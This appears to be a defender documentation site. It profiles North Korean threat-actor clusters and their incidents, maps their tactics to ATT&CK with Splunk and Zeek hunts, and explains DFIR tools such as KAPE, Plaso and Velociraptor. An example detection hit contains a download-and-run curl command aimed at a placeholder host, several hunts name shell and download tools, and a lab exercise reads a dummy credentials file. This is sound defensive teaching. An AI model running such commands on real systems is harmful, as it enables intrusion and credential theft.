docs.title: Threat Intelligence
docs.text:
Who is behind the techniques in the Adversary section. Each actor page answers three questions: who they are (attribution, aliases, mission), what they have done (major public incidents), and how they do it — their TTPs mapped to ATT&CK and linked to the technique pages on this site, so you can go straight from "this group uses X" to "this is how X looks in my logs".

Public sources only

Everything here comes from public government advisories, MITRE ATT&CK and vendor reports. Attribution and alias mappings are vendor assessments and the groups overlap — treat names as labels for clusters of activity, not exact org charts.

Page What's in it North Korea (DPRK) — groups & incidents The RGB-linked clusters (Lazarus, APT38/BlueNoroff, TraderTraitor, Andariel, Kimsuky, APT37, IT workers), alias table, major heists and attacks 2014 → 2025 North Korea — TTPs & hunting Their playbook phase by phase (fake recruiters, trojanised packages, supply chain, cloud pivot, macOS), ATT&CK mapping, Splunk/Zeek hunts

docs.title: How to read a threat-intel page as a defender
docs.text:
1. Skip the malware names, keep the behaviours. Malware gets renamed every few months; "a developer ran a coding-test repo and Node.js spawned a shell" stays true for years.
  2. Map every behaviour to a technique you can see. If you cannot point at a log source for a behaviour, that is a visibility gap — write it down.
  3. Turn the top three behaviours into hunts. Use the purple-team loop: reproduce in a lab → find the artifacts → write the query → document.

docs.title: North Korea (DPRK) — Groups & Incidents
docs.text:
Category: Threat actor profile · Sponsor: Reconnaissance General Bureau (RGB) and related state bodies · Last updated: 2026-10-07

Summary

North Korea runs one of the most capable and most financially motivated state cyber programmes in the world. MITRE ATT&CK attributes the Lazarus Group to the RGB; the FBI attributed the February 2025 theft of roughly US$1.5 billion in crypto from the Bybit exchange to the DPRK's "TraderTraitor" activity — the largest single theft on record. The same ecosystem also does classic espionage (defence, government, think tanks, South Korea) and destructive attacks. What makes them dangerous is not exotic tooling but patient social engineering, supply-chain thinking and fast operational pivots — exactly what a defender must learn to recognise.

docs.title: Why defenders study DPRK actors
docs.text:
• Money is the mission. Revenue for the state (sanctions evasion) drives most operations, so banks, SWIFT operators, crypto exchanges, DeFi projects and their developers are primary targets.
  • They target people, not just networks. Fake recruiters, fake coding tests, fake investors, fake job applicants (IT workers) — the initial access is human.
  • They are multi-platform. Windows, macOS (developers and crypto staff), Linux servers, npm/PyPI packages, cloud consoles.
  • They reuse a recognisable behavioural playbook that maps cleanly onto ATT&CK — see TTPs & hunting.

docs.title: The clusters and their names
docs.text:
Every vendor names the same activity differently. "Lazarus" is used both for one group and as an umbrella for all RGB activity. This table lines the names up (vendor assessments; overlaps are normal).

Cluster (common name) Other names ATT&CK Main mission Known for Lazarus Group (umbrella / core) Hidden Cobra, Diamond Sleet (ZINC), Labyrinth Chollima, Selective Pisces G0032 Espionage, destruction, theft Sony Pictures (2014), WannaCry (2017), fake-job "Operation Dream Job" against defence & aerospace APT38 / BlueNoroff Sapphire Sleet, Stardust Chollima, Alluring Pisces G0082 Financial theft Bangladesh Bank SWIFT heist (2016), banks, ATMs, crypto firms; macOS malware (RustBucket, KANDYKORN) TraderTraitor Jade Sleet, UNC4899, Slow Pisces — Crypto theft via developers & supply chain Ronin (2022), JumpCloud (2023), DMM Bitcoin (2024), Bybit (2025) AppleJeus cluster Citrine Sleet, Gleaming Pisces, (UNC4736 per Mandiant for 3CX) — Crypto theft Trojanised crypto-trading apps; the 3CX double supply-chain compromise (2023) Andariel Onyx Sleet, Silent Chollima, Jumpy Pisces G0138 Espionage + ransomware for funding Defence, healthcare, engineering; Maui ransomware against US healthcare Kimsuky APT43, Emerald Sleet (THALLIUM), Velvet Chollima, Sparkling Pisces G0094 Intelligence collection South Korean government, unification/foreign-policy experts, think tanks, journalists; spear-phishing with HWP/LNK/CHM lures APT37 ScarCruft, Reaper, InkySquid, Ricochet Chollima G0067 Espionage South Korea, defectors, journalists; HWP exploits, cloud-storage C2 IT workers / "Contagious Interview" Famous Chollima, Jasper Sleet — Revenue (salaries), insider access, extortion DPRK nationals hired remotely under false identities using "laptop farms"; fake-interview malware (BeaverTail, InvisibleFerret) against job seekers

Practical rule

In a report, write down which vendor name you are quoting. "Lazarus did X" from one vendor and "Sapphire Sleet did X" from another may be the same event — or not.

docs.text: Year Incident Cluster (as reported) What happened Lesson for defenders 2014 Sony Pictures Lazarus Data theft, leaks and wiper malware destroying thousands of hosts Destructive attacks follow long, quiet access — hunt for the access, not just the wiper 2016 Bangladesh Bank APT38 Fraudulent SWIFT transfers; about US$81 million lost (US$951 million attempted) Attackers learned the bank's own payment process; log business systems, not just IT 2017 WannaCry Lazarus Worming ransomware using EternalBlue / MS17-010 Patch SMBv1 — see EternalBlue 2022 Ronin Network (Axie Infinity) TraderTraitor About US$620 million stolen after an engineer opened a fake job-offer document Developers with signing/validator keys are crown-jewel users 2023 3CX AppleJeus cluster Trojanised 3CX desktop app shipped to customers; 3CX itself was breached through an earlier trojanised app (X_Trader) — the first known chained supply-chain attack A signed, trusted vendor binary can be the implant — baseline its network behaviour 2023 JumpCloud TraderTraitor Breach of an identity/MDM provider used to reach a small set of crypto customers Your SaaS provider's admin plane is part of your attack surface 2024 DMM Bitcoin TraderTraitor About US$308 million in BTC stolen after a wallet-software employee ran a malicious "pre-employment test" Coding tests from strangers are a delivery mechanism 2025 Bybit TraderTraitor About US$1.5 billion in ETH stolen. A Safe{Wallet} developer's macOS machine was compromised; stolen AWS session tokens were used to alter the wallet front-end JavaScript so a routine transfer was redirected Cloud session tokens + front-end integrity; FBI PSA I-022625-PSA Ongoing IT worker schemes Famous Chollima Thousands of remote developers working under stolen/fake identities, US "laptop farms" dismantled by the DOJ HR, identity verification and VPN/geo anomalies are security controls

docs.title: What their tradecraft looks like (one picture)
docs.text:
flowchart LR
    A[Social engineering<br/>LinkedIn / Telegram / email<br/>fake recruiter or investor] --> B[Payload<br/>coding test repo, npm/PyPI package,<br/>trojanised app, HWP/LNK lure]
    B --> C[Execution on dev laptop<br/>node / python / osascript / powershell]
    C --> D[Credential & token theft<br/>browser data, SSH keys,<br/>cloud session tokens, keychains]
    D --> E[Pivot<br/>VPN, cloud console, CI/CD,<br/>signing infrastructure]
    E --> F[Objective<br/>wallet/transfer manipulation,<br/>supply-chain implant, espionage]
    F --> G[Cash-out / exfil<br/>mixers, bridges, cloud storage C2]

docs.title: North Korea — TTPs & Hunting
docs.text:
Category: Actor TTPs → detection · Covers: Lazarus, APT38/BlueNoroff, TraderTraitor, AppleJeus cluster, Andariel, Kimsuky, APT37 · Last updated: 2026-10-07

Summary

The DPRK playbook, phase by phase: how they get in (fake recruiters, coding tests, poisoned packages, supply chain, document lures), what runs, how they steal credentials and cloud session tokens, how they pivot and what they finally do. Every phase is mapped to ATT&CK and to the technique pages on this site, followed by hunts you can run in Splunk and Zeek. Background on the groups is in Groups & incidents.

docs.title: 1. Initial access — they target the person
docs.text: Behaviour ATT&CK Who (as reported) Where to look Fake recruiter on LinkedIn/Telegram/WhatsApp sends a "job description" PDF or a link T1566.003 (Spearphishing via Service), T1566.002 Lazarus (Dream Job), TraderTraitor Browser downloads, Zone.Identifier, email/proxy logs "Take-home coding test" — a GitHub/Bitbucket repo or ZIP the victim runs with npm install / python main.py T1204.002 (Malicious File), T1195.001 TraderTraitor, Contagious Interview Process tree under node, python, docker Malicious or typosquatted npm / PyPI packages T1195.001 (Compromise Software Dependencies) TraderTraitor, Contagious Interview Package manifests, postinstall scripts, EDR on dev hosts Trojanised trading / crypto apps, sometimes signed T1195.002, T1553.002 (Code Signing) AppleJeus cluster New unsigned/odd-publisher binaries in Amcache, macOS quarantine events Compromise of a software vendor to reach its customers T1195.002 (Compromise Software Supply Chain), T1199 AppleJeus cluster (3CX), TraderTraitor (JumpCloud) Trusted vendor binary making new network connections Document lures: LNK in ZIP, CHM, HWP, Office T1566.001, T1204.002 Kimsuky, APT37 See Phishing delivery Fake job applicant (IT worker) hired remotely T1078 (Valid Accounts), insider Famous Chollima HR process, VPN geolocation, remote-admin tools on corporate laptops

docs.title: 2. Execution and persistence
docs.text: Behaviour ATT&CK Site page node/python spawning a shell, curl, or a downloader T1059.007 (JavaScript), T1059.006 (Python) — (hunt 1 below) PowerShell download cradles, encoded commands (Windows lures) T1059.001 PowerShell cradles mshta, rundll32, regsvr32 from LNK/CHM lures (Kimsuky) T1218.005 / .011 / .010 LOLBins Scheduled tasks, services, Run keys T1053.005, T1543.003, T1547.001 Persistence macOS LaunchAgents / LaunchDaemons T1543.001, T1543.004 — (macOS: ~/Library/LaunchAgents, /Library/LaunchDaemons) Malicious browser extensions stealing mail (Kimsuky) T1176 (Browser Extensions) Extension folders in browser profiles DLL side-loading / injection into trusted processes T1574.002, T1055 Process injection

docs.title: 3. Credential access — and the cloud pivot
docs.text:
This is where DPRK operations differ from commodity crime: they go after developer secrets and cloud sessions, not only Windows hashes.

Behaviour ATT&CK Site page / note Browser passwords, cookies, crypto-wallet extension data T1555.003, T1539 (Steal Web Session Cookie) Infostealer behaviour — file access to browser profile folders SSH keys, .aws/credentials, .env, .npmrc, keychain T1552.001, T1552.004, T1555.001 Watch reads of these paths by non-standard processes Stolen cloud session tokens reused from attacker infrastructure T1550.001 (Application Access Token), T1078.004 (Cloud Accounts) Hunt 3 below (CloudTrail) Registering a new MFA device on a stolen session T1098.005 (Device Registration) Hunt 3 below LSASS, SAM/NTDS, Kerberos abuse inside Windows networks T1003, T1558 LSASS · SAM & NTDS · Kerberoasting

docs.title: 4. Lateral movement, C2 and objective
docs.text: Behaviour ATT&CK Site page RDP, SMB/PsExec, WMI with stolen credentials T1021.001, T1021.002, T1047 RDP · PsExec · WMI HTTPS C2 to compromised legitimate websites; custom protocols T1071.001, T1573 Beaconing & C2 C2 over cloud storage APIs (Dropbox, pCloud, Google Drive, OneDrive) — APT37, Kimsuky T1102.002 (Bidirectional Web Service) Hunt 4 below Multi-hop proxies, VPNs, residential IPs T1090.003 (Multi-hop Proxy) Login geolocation / ASN anomalies Tampering with a transaction front-end or signing flow (Bybit) T1565 (Data Manipulation) File integrity monitoring on web assets / S3 buckets Financial theft T1657 (Financial Theft) Business process monitoring Wipers / ransomware (Sony, Maui) T1485, T1486 Ransomware playbook

docs.title: Hunts
docs.text:
All queries use the BOTSv3-style index and sourcetypes used elsewhere on this site — change index= to match your environment.

1 · Dev runtime spawning a shell2 · New binary from a trusted vendor talks out3 · Cloud token reuse & MFA device added (AWS)4 · C2 over cloud storage APIs (Zeek) 
index=botsv3 sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1
    (ParentImage="*\\node.exe" OR ParentImage="*\\python.exe" OR ParentImage="*\\pythonw.exe")
    (Image="*\\cmd.exe" OR Image="*\\powershell.exe" OR Image="*\\curl.exe" OR Image="*\\certutil.exe" OR Image="*\\mshta.exe")
| stats count min(_time) as first max(_time) as last values(CommandLine) as cmd by host, User, ParentImage, Image
| convert ctime(first) ctime(last)

What each line does

  • EventID=1 — Sysmon event 1 = process created. Every new process, with its parent and full command line.
  • ParentImage="*\\node.exe" … — keep only processes whose parent is Node.js or Python (the runtimes a "coding test" or malicious npm/PyPI package runs under). \\ is one backslash written in SPL.
  • Image=… — the child is a shell or a download tool. Developers do run shells from Node, so expect some noise (build scripts); the interesting ones download or run encoded commands.
  • stats … by host, User, ParentImage, Image — collapse into one row per combination; values(CommandLine) lists the distinct commands.
  • convert ctime(...) — turn epoch numbers into readable dates.

What a hit looks like

host User ParentImage Image cmd DEV-LAPTOP07 CORP\jkim C:\Program Files\nodejs\node.exe C:\Windows\System32\cmd.exe cmd /c curl -s hxxp://<ip>/p -o %TEMP%\p.py && python %TEMP%\p.py

On macOS/Linux EDR the same idea: parent node / python3, child sh/bash/curl/osascript.

index=botsv3 sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=3
| stats dc(DestinationIp) as dests values(DestinationHostname) as names min(_time) as first by Image
| where first > relative_time(now(), "-7d@d")
| sort - dests
  • EventID=3 — Sysmon network connection.
  • stats … min(_time) as first by Image — for every program, the first time it ever made a connection in the search window.
  • where first > relative_time(now(), "-7d@d") — keep programs that started talking only in the last 7 days (run the search over 30+ days so "first" means something). relative_time(now(), "-7d@d") = midnight seven days ago.
  • This catches the 3CX pattern: a signed, long-installed app that suddenly contacts new domains after an update.
index=botsv3 sourcetype=aws:cloudtrail
    eventName IN ("CreateVirtualMFADevice","EnableMFADevice","CreateAccessKey","AssumeRole","GetSessionToken","PutBucketPolicy","PutObject")
| stats values(eventName) as actions dc(sourceIPAddress) as ips values(sourceIPAddress) as src values(userAgent) as ua by userIdentity.arn
| where ips > 1 OR isnotnull(mvfind(actions,"MFADevice"))
  • sourcetype=aws:cloudtrail — AWS API audit log; every console/API call is one event.
  • eventName IN (...) — calls an intruder uses after stealing a session: add an MFA device, create keys, assume roles, change bucket policy, upload objects (Bybit: the front-end JavaScript in S3 was replaced).
  • stats … by userIdentity.arn — per identity, which actions, how many source IPs, which user agents.
  • where ips > 1 OR … — the same identity used from more than one IP (developer laptop + attacker VPN) or any MFA-device change. mvfind(actions,"MFADevice") returns the position of the first value matching the regex, or null.
# SNI / host names of cloud-storage APIs contacted by hosts that are not normal sync clients
zeek-cut ts id.orig_h server_name < ssl.log \
  | grep -Ei 'api\.dropboxapi\.com|content\.dropboxapi\.com|api\.pcloud\.com|graph\.microsoft\.com|www\.googleapis\.com' \
  | awk '{print $2, $3}' | sort | uniq -c | sort -rn | head -20
  • zeek-cut pulls named columns from a Zeek log; server_name is the TLS SNI (the host name the client asked for).
  • The grep keeps the API endpoints used for programmatic upload/download — APT37 and Kimsuky malware use these as C2 so traffic blends in.
  • Count per source host: a workstation with thousands of api.pcloud.com connections and no pCloud client installed is worth a look.

docs.title: A purple-team scenario built from this page
docs.text:
Use it with the weekly purple-team loop:

  1. Week A — Delivery: in a lab VM, run a harmless "coding test" repo whose postinstall script runs cmd /c whoami > %TEMP%\out.txt. Find it with hunt 1, in Prefetch/Amcache, and in Velociraptor (Windows.System.Pslist, Windows.Forensics.Prefetch).
  2. Week B — Credential access: read a dummy .aws\credentials file from a script; check which log source (Sysmon 11? EDR file-read telemetry?) sees it. Record the gap if none.
  3. Week C — Cloud pivot: in a free-tier lab AWS account, use the same access key from two IPs and add a virtual MFA device; confirm hunt 3 fires in CloudTrail.
  4. Week D — C2: generate HTTPS traffic to a cloud-storage API from a script; confirm hunt 4 and Arkime/Zeek visibility.
  5. Write one page per week: behaviour → artifacts → query → ATT&CK ID → gaps.

docs.text: The DFIR toolbox — what each tool is for, the commands that matter, and how they fit together. The chain is almost always acquire → collect → parse → timeline → review, and these pages cover each stage.

Adding a tool

docs.title: Disk & Memory Imaging
docs.text:
Category: Evidence acquisition · Platform: Windows / Linux · Last updated: 2026-09-17

In one sentence

When you need a defensible, complete copy — not just triage artifacts — you image the memory (volatile, capture first) and the disk (a bit-for-bit forensic image), each with a hash so you can prove it hasn't changed. This page covers the order of volatility, the standard tools, and the hashing/write-blocking that keeps evidence sound.

docs.title: Order of volatility — capture in this order
docs.text:
Most volatile first, because collecting later items disturbs earlier ones:

  1. RAM (memory image) + current network connections, running processes, logged-on users.
  2. Running-system state you can't get from an image later: routing/ARP, open ports, mounted shares — but a full RAM image captures most of this.
  3. Disk (forensic image, or triage collection).
  4. Remote/archival logs (SIEM, firewall) — least volatile.

If the machine will be powered off, image RAM before anything else and before shutdown — memory is gone at power-off.

docs.title: Memory acquisition
docs.text:
Tool Platform Command / note WinPmem Windows winpmem.exe -o mem.raw (or .aff4) — open-source, driver-based, reliable Magnet RAM Capture Windows GUI, free, small footprint DumpIt (Comae) Windows Double-click → raw/.dmp; simple FTK Imager Windows File → Capture Memory (also includes pagefile) AVML Linux avml mem.lime — Microsoft's portable Linux acquirer (LiME format) LiME Linux Loadable kernel module → .lime avml / procdump targeted For a single process rather than whole RAM

Notes: capture to an external drive or over the network, not the subject's disk (writing to it destroys evidence and slack). Also grab the pagefile/swap (C:\pagefile.sys, hiberfil.sys) and, on Linux, /proc/kcore isn't a substitute — use AVML/LiME. Analyse with Volatility 3 (Memory forensics).

# WinPmem to an external drive, then hash it
E:\winpmem.exe -o E:\case\mem.raw
certutil -hashfile E:\case\mem.raw SHA256 > E:\case\mem.raw.sha256

docs.title: Disk imaging
docs.text:
Tool Platform Note FTK Imager Windows GUI; images to E01 (compressed, hashed, metadata) or raw dd; can image physical drive, logical volume, or mount images read-only dc3dd / dcfldd Linux dd with hashing, progress, error handling built in dd Linux Baseline: dd if=/dev/sdb of=/evidence/disk.img bs=4M conv=noerror,sync status=progress Guymager Linux Fast GUI imager, E01/raw, verifies as it goes ewfacquire (libewf) Linux Create E01 from CLI X-Ways / EnCase Windows Commercial, court-standard

Formats: E01 (EWF) is preferred for evidence — it compresses, stores the hash and case metadata inside the file, and splits into segments; raw/dd is a plain bit copy (largest, universally readable). E01 mounts read-only in FTK Imager, Arsenal Image Mounter, or ewfmount for parsing with any tool (including KAPE --tsource).

# Linux, physical disk /dev/sdb → E01 with hashing
ewfacquire -t /evidence/case01 -f encase6 -c fast -S 2GiB /dev/sdb
# or raw with dc3dd + hash
dc3dd if=/dev/sdb of=/evidence/disk.dd hash=sha256 log=/evidence/dc3dd.log

docs.title: Write-blocking and hashing — non-negotiable
docs.text:
• Write-block the source. Use a hardware write blocker for physical disks, or a software/OS read-only mount when imaging a file. The source must not change during acquisition.
  • Hash before and after. Compute SHA-256 (MD5 additionally for legacy tooling) of the source and of the image; they must match. E01 stores this internally and verifies on read; for raw, keep a .sha256 sidecar.
  • Document: who, when, tool + version, source device serial, hashes, chain of custody. FTK Imager and Guymager write this automatically; for dd keep a log.
  • Verify the image after acquisition (FTK Imager Verify, ewfverify, or re-hash) before you rely on it.

docs.title: Live vs. dead acquisition
docs.text:
Live (system running) Dead (powered off / boot to forensic OS) RAM Yes — only chance No (gone at power-off) Disk Possible but system is changing; use triage (KAPE/Velociraptor) or image mounted volumes Cleanest — pull the disk or boot a forensic USB (CAINE, Tsurugi, Paladin), write-blocked When Can't take the box down; need volatile data; encrypted disk unlocked only while running Can power down; want the most defensible image

For a BitLocker/LUKS-encrypted disk, image it live (or capture the key/RAM) — a dead image of an encrypted volume is just ciphertext unless you have the recovery key.

docs.title: Cloud & virtual
docs.text:
• VM: snapshot + copy the virtual disk (.vmdk/.vhdx) and the memory snapshot (.vmsn/.vmem) — often easier and cleaner than in-guest imaging.
  • Cloud instance: snapshot the volume, export/attach it to a forensic instance; capture memory in-guest if you can. Preserve the snapshot and its metadata.

docs.title: Gotchas
docs.text:
• Never write the image to the source drive or the subject's own volume.
  • Imaging is slow (hours for large disks) — plan capacity (image ≥ source size; E01 compresses but budget generously).
  • A triage collection is not a forensic image — KAPE/Velociraptor copy chosen artifacts; for unallocated space, carving, and full defensibility you need the image.
  • Match your evidence drive's filesystem to file sizes (a >4 GB image won't fit on FAT32 — use exFAT/NTFS).
  • Keep the original untouched; work on copies.

docs.title: KAPE
docs.text:
Category: Triage collection & parsing · Platform: Windows · Last updated: 2026-09-17

What it does

KAPE (Kroll Artifact Parser and Extractor) does two things: Targets copy forensic artifacts off a live or mounted system (fast, defeats file locks via raw NTFS reads), and Modules run third-party tools over what was collected to produce CSV/JSON output. One command turns a running machine into a folder of parsed evidence in minutes. Free for use; GUI (gkape.exe) and CLI (kape.exe).

docs.title: The mental model
docs.text:
flowchart LR
    S[Live / mounted system] -->|Targets: copy files| C[tout: collected artifacts]
    C -->|Modules: run tools| M[mout: parsed CSV/JSON]
    M --> TE[Timeline Explorer / review]
  • Target = what to copy (a .tkape file listing paths/masks). --tsource where to read, --tdest where to write.
  • Module = what to run (a .mkape file wrapping a tool + arguments). --msource (usually = tdest) and --mdest where output goes.
  • You can run Targets only, Modules only, or both in one pass.

docs.title: The commands you actually use
docs.text:
# Full triage of C: — the "just collect the important stuff" command
kape.exe --tsource C: --tdest E:\%d\tout --target !SANS_Triage --vss

# Collect AND parse in one pass (triage → CSVs ready for Timeline Explorer)
kape.exe --tsource C: --tdest E:\%d\tout --target !SANS_Triage `
         --msource E:\%d\tout --mdest E:\%d\mout --module !EZParser --vss

# One artifact family
kape.exe --tsource C: --tdest E:\out --target EventLogs --mdest E:\out\m --module EvtxECmd
kape.exe --tsource C: --tdest E:\out --target RegistryHives --mdest E:\out\m --module RECmd_BatchExamples

# Parse an already-collected folder (Modules only)
kape.exe --msource E:\out\tout --mdest E:\out\mout --module !EZParser

# Mounted image (E01/VHD mounted read-only as F:)
kape.exe --tsource F: --tdest E:\out --target !SANS_Triage

Handy flags: %d / %m in a path expand to date / machine name (keeps cases separate); --vss also pulls from Volume Shadow Copies (older versions of files — huge for extending log/journal history); --vhdx CASE writes the collection into a VHDX container instead of loose files; --zip NAME zips it; --gui opens the file picker; --debug/--trace for troubleshooting; --tflush/--mflush clear the destination first.

docs.title: Targets worth knowing
docs.text:
Target Collects !SANS_Triage The all-in-one: $MFT, $J, $LogFile, registry hives + logs, EVTX, Prefetch, Amcache, SRUM, LNK/JumpLists, scheduled tasks, browser data, PowerShell history, WMI, and more — start here !BasicCollection Smaller core set KapeTriage Similar broad triage compound target FileSystem $MFT, $J, $LogFile, $Boot, $SDS RegistryHives, RegistryHivesSystem, RegistryHivesUser SYSTEM/SOFTWARE/SAM/SECURITY, NTUSER.DAT, UsrClass.dat + transaction logs EventLogs All .evtx Prefetch, Amcache, SRUM Named artifacts LNKFilesAndJumpLists, RecentFileCache File-knowledge WebBrowsers, Chrome, Edge, Firefox Browser history/cache/downloads ScheduledTasks, WindowsTimeline, PowerShellConsole as named RDPCache, EventTraceLogs, MFTMirror niche but useful

Targets compose: !SANS_Triage is a compound target that pulls in dozens of others. List them with --tlist or browse the Targets\ folder.

docs.title: Modules worth knowing
docs.text:
Module Runs !EZParser The compound module — runs all the Eric Zimmerman parsers over a triage collection (MFTECmd, EvtxECmd, PECmd, AmcacheParser, AppCompatCacheParser, RECmd, LECmd, JLECmd, SrumECmd, SBECmd, …) → one CSV per artifact EvtxECmd, PECmd, MFTECmd, AmcacheParser, AppCompatCacheParser, RECmd_*, LECmd, JLECmd, SrumECmd, SBECmd Individual Zimmerman tools hayabusa, Chainsaw Sigma-based EVTX hunting → detections CSV Nirsoft_*, RegRipper Alternative parsers VirusTotal, Loki, capa Enrichment / malware triage (some need keys/binaries in the module's bin folder)

Modules need the actual tool binary present — KAPE looks in Modules\bin\. --mlist lists them; Get-KAPEUpdate.ps1 (ships with KAPE) updates Targets/Modules from the community repo.

docs.title: Typical workflow
docs.text:
1. Boot to the subject (or mount its image read-only), plug in an evidence drive E:.
  2. kape.exe --tsource C: --tdest E:\%d\tout --target !SANS_Triage --vss — collect (minutes).
  3. kape.exe --msource E:\%d\tout --mdest E:\%d\mout --module !EZParser — parse (can be done later, off-host).
  4. Open mout in Timeline Explorer; start with MFTECmd ($MFT/$J), EVTX, Prefetch, Amcache.
  5. For hunting, also run --module hayabusa or Chainsaw over the EVTX.

Collect on-host, parse off-host

Targets are fast and safe to run on a live machine; Modules are heavier and pull in third-party tools. Standard practice: run Targets on the subject to a removable/network drive, then run Modules on your analysis workstation against that collection. Keeps the subject's footprint small and lets you re-parse without touching it again.

docs.title: Gotchas
docs.text:
• Run as Administrator — raw volume reads and locked files need it.
  • --tdest should be a different volume than --tsource (don't write evidence onto the subject).
  • --vss multiplies collection size and time; worth it when you need history, skip for a quick look.
  • Modules silently do nothing if the tool binary is missing from Modules\bin\ — check --mlist and the console output.
  • KAPE reads NTFS directly, so it copies locked/system files, but it is not a full disk image — for a forensic image use imaging tools.
  • Output timestamps are UTC (the Zimmerman parsers default to UTC); confirm in Timeline Explorer.

docs.text:

  • KapeFiles — community Targets & Modules

docs.title: Plaso & Super-Timelines
docs.text:
Category: Timelining · Platform: Linux / Windows / Docker · Last updated: 2026-09-17

What it does

Plaso (log2timeline) parses every timestamped artifact it can find — file system, registry, event logs, browser, prefetch, and hundreds more — into one normalised timeline, so you can see everything that happened on a system in chronological order. A "super-timeline" answers what happened, in what order when you don't yet know where to look; the trade-off is volume, so filtering is the whole skill.

docs.title: The pipeline
docs.text:
flowchart LR
    E[Image / triage folder] -->|log2timeline.py| S[(storage .plaso<br/>every event, all parsers)]
    S -->|psort.py| O[Filtered, formatted output<br/>CSV / JSON / TL / Timesketch]
    S -->|pinfo.py| I[What's inside the store]
    O --> R[Timeline Explorer / Timesketch]
  • log2timeline.py ingests a source into a .plaso storage file (runs many parsers).
  • psort.py post-processes: filter by time/parser/field, deduplicate, and output to a format.
  • pinfo.py reports what a .plaso contains (parsers, counts, time range).
  • psteal.py = log2timeline + psort in one command (quick end-to-end).

docs.title: Commands
docs.text:
# Ingest a mounted image or triage folder (Docker keeps deps clean)
log2timeline.py --storage-file case.plaso /evidence/

# Only the parsers you need (faster, smaller) — e.g. Windows triage
log2timeline.py --parsers "win7,!filestat" --storage-file case.plaso /evidence/
log2timeline.py --parsers "mft,usnjrnl,winevtx,winreg,prefetch,amcache,lnk,olecf" --storage-file case.plaso /evidence/

# See what's in the store
pinfo.py case.plaso

# Output a filtered CSV for Timeline Explorer (l2tcsv is the classic wide format)
psort.py -o l2tcsv -w timeline.csv case.plaso "date > '2026-08-20 00:00:00' AND date < '2026-08-21 00:00:00'"

# Only certain parsers / sources, dedupe
psort.py -o dynamic -w tl.csv case.plaso "parser contains 'winevtx' OR parser contains 'mft'"

# One-shot ingest + output
psteal.py --source /evidence/ -o l2tcsv -w timeline.csv

# Push straight into Timesketch for browser-based analysis
psort.py -o timesketch --name "Case01" case.plaso

Parser presets (win7, winxp, linux, macos, webhist) pull sensible groups; --parsers with !name excludes. filestat (one event per file MACB) is enormous — exclude it unless you need it.

docs.title: Filtering — the actual skill
docs.text:
A raw super-timeline is millions of rows; nobody reads that. You anchor and window:

# Everything within ±1 hour of a known-bad event, then read outward
psort.py -o l2tcsv -w window.csv case.plaso \
  "date > '2026-08-20 14:00:00' AND date < '2026-08-20 16:00:00'"

# Only execution/persistence-relevant sources
psort.py -o dynamic -w exec.csv case.plaso \
  "parser contains 'prefetch' OR parser contains 'amcache' OR parser contains 'winevtx' OR parser contains 'winreg'"

Then in Timeline Explorer (or Timesketch): filter the source/parser columns, search for the user/host/path, colour the rows that matter, and follow the sequence. The l2tcsv format's MACB column tells you whether each row is a Modified/Accessed/Changed/Born timestamp.

docs.title: Plaso vs. the Zimmerman timeline
docs.text:
Plaso super-timeline MFTECmd --body + others Coverage Everything, one file Per-artifact CSVs you combine Volume Huge — must filter hard Targeted — each CSV is readable Best when You don't know where to look; want the full picture You know the artifact; want clean, columnar detail Review Timeline Explorer / Timesketch Timeline Explorer per tab

In practice: use the Zimmerman CSVs for focused analysis of specific artifacts, and Plaso when you need the combined chronology across all sources at once. Both open in Timeline Explorer.

docs.title: Timesketch (collaborative timelines)
docs.text: Timesketch is a web app for exploring Plaso timelines: import the .plaso (or CSV/JSONL), then search with a Lucene-like syntax, save views, tag events, star findings, and share a sketch with the team. Analyzers (community) auto-tag known patterns. Good for a team working one large timeline; overkill for a single quick triage.

docs.title: Gotchas
docs.text:
• Timezone: set -z / --timezone on log2timeline.py to the source's zone so events normalise correctly; output is UTC unless told otherwise — always state the zone in the report.
  • filestat bloat: it emits four rows per file. Exclude it (--parsers '!filestat') unless MACB-per-file is the point.
  • Runtime: a full image can take hours. Use parser presets and point at a triage collection (KAPE output) rather than the whole disk when you can.
  • Duplicates: psort.py dedupes, but overlapping parsers still produce near-duplicate rows — filter by source.
  • Version drift: run Plaso from the official Docker image to avoid Python dependency pain.
  • A super-timeline is a lead generator, not a final artifact — confirm findings in the underlying artifact (Windows pages).

docs.text:

  • log2timeline/plaso GitHub · Docker usage
  • Timesketch

docs.title: Velociraptor
docs.text:
Category: Endpoint visibility, hunting & collection · Platform: Windows / Linux / macOS · Last updated: 2026-09-17

What it does

Velociraptor is an open-source DFIR platform: a server plus lightweight agents that let you query thousands of endpoints at once in VQL (Velociraptor Query Language), collect artifacts, hunt for indicators, and pull files — live, across the fleet, in minutes. Where KAPE triages one machine, Velociraptor asks a question of every machine. Also runs offline as a standalone collector with no server.

docs.title: How it's put together
docs.text:
flowchart LR
    A1[Agent Win] --- SRV[Velociraptor server<br/>GUI + VQL engine]
    A2[Agent Linux] --- SRV
    A3[Agent macOS] --- SRV
    SRV --> H[Hunt: run an artifact<br/>across all/selected clients]
    SRV --> N[Notebook: VQL + markdown<br/>post-process results]
    SRV --> F[Collected files & results]
  • Artifact = a named, parameterised VQL query (e.g. Windows.Forensics.Prefetch) — the unit of collection/detection. Hundreds ship built in; you can write your own.
  • Hunt = run an artifact across many clients and gather the results centrally.
  • Client collection = run artifacts against one endpoint interactively.
  • Notebook = VQL + markdown workspace to slice results (like a Jupyter for DFIR).
  • Offline collector = a self-contained .exe you build in the GUI that runs a chosen set of artifacts on a machine with no server and drops a ZIP — great for air-gapped or one-off triage.

docs.title: Getting started (lab)
docs.text:
# One binary is server, client and collector depending on args.
# Generate a server config, run the server (GUI on https://127.0.0.1:8889)
velociraptor.exe config generate > server.yaml
velociraptor.exe --config server.yaml frontend -v

# Build a client MSI/config from the GUI, deploy to endpoints (or run one client manually)
velociraptor.exe --config client.yaml client -v

# Standalone: query the local machine with no server at all
velociraptor.exe query "SELECT Name, Pid, Exe FROM pslist()"
velociraptor.exe artifacts collect Windows.Forensics.Prefetch --output pf.zip

docs.title: VQL in one screen
docs.text:
VQL looks like SQL but every data source is a plugin function (pslist(), glob(), parse_evtx()), and you pipe rows through WHERE/SELECT/ORDER BY. Column functions transform values.

-- Processes whose binary lives in a user-writable path
SELECT Pid, Name, Exe, CommandLine
FROM pslist()
WHERE Exe =~ "(?i)\\\\(Users|ProgramData|Windows\\\\Temp)\\\\"

-- Search every EVTX for a logon type 10 (RDP) from a given IP
SELECT *
FROM parse_evtx(filename="C:/Windows/System32/winevt/Logs/Security.evtx")
WHERE System.EventID.Value = 4624
  AND EventData.LogonType = 10
